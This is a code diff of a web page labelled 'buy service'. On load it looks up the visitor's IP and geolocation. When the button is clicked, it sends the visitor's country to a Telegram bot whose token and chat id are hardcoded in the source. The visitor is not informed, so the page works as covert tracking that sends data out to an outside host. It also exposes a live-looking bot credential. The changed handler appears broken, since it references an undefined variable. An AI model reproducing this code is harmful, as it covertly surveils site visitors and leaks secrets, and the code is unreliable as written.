@@ -6,8 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-<body onclick="buy_service()">
-    <h2 onclick="buy_service()">buy service</h2>
+<body>
     <script>
 async function fetchInfo(url, ip='') {
     try {
@@ -25,8 +24,9 @@ fetchInfo(ipifyUrl)
     .then(d => fetchInfo(ipApiUrl, d.ip))
     .then(data => {
     console.log(data)
-    fetchdata = data
-        //document.querySelector("body").innerHTML=`<div>
+    
+    
+        document.querySelector("body").innerHTML='<h2 onclick="service(data)">Buy Servicessd</h2>'
          //   <p>${data.country}</p>
           //  <p>${data.regionName}</p>
           //  <p>${data.city}</p>
@@ -38,7 +38,7 @@ fetchInfo(ipifyUrl)
         //</div>`
     });
         
-        async function buy_service(){
+        async function service(data){
     
     let res = await fetch("https://api.telegram.org/bot1505568108:AAHUD1iNTmWSXCYVhPjOk3ir9c9ePjheCrU/sendMessage",{
         method: "POST",
@@ -47,7 +47,7 @@ fetchInfo(ipifyUrl)
         },
         body: JSON.stringify({
             chat_id:"648066821",
-            text: fetchdata.country + 'user',
+            text: data.country + 'user',
             parse_mode: "HTML" 
         })
     })
